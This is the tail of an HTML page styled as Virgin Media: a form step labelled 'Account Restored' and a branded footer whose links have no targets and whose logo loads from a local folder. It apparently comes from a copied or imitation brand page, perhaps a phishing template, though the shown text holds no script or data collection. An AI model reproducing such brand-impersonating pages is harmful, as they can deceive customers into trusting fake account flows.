                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#your-completed-order">
                                                <i class="checkout-icon order-completed"></i>Account Restored
                                            </a>
                                        </h4>
                                    </div>
                                </div>
                                
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <footer class="footer hidden-print">
            <div class="container">
                <nav class="shift-left-desktop">
                    <ul class="nav footer-nav row">
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>About Virgin Media</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Careers</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Advertise with us</a>
                        </li><li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Accessibility</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Legal stuff</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Site Map</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12"><a>Contact us</a>
                        </li>
                        <li class="foot-links col-md-3 col-sm-4 col-xs-6 col-xxs-12 no-border"><a>Our cookies</a>
                        </li>
                    </ul>
                </nav>
                <div class="footer-logo clearfix shift-right-desktop">
                    <p class="pull-right">
                        <span>© 2015 Virgin Media.</span><br> All Rights Reserved
                        <a>
                            <img width="54" height="34" alt="Virgin Media" src="assets/images/vm-logo-sm.png">
                        </a>
                    </p>
                </div>
            </div>
        </footer>
    </body>
</html>